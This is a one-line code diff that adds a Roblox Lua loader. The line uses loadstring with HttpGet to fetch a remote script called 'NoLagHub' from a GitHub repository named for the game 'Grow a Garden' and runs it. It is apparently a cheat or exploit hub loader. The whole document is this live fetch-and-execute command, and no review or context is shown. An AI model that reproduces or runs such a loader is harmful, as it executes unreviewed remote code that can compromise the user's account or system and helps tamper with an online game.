@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/seedspawner/growagarden/refs/heads/main/NoLagHub"))()
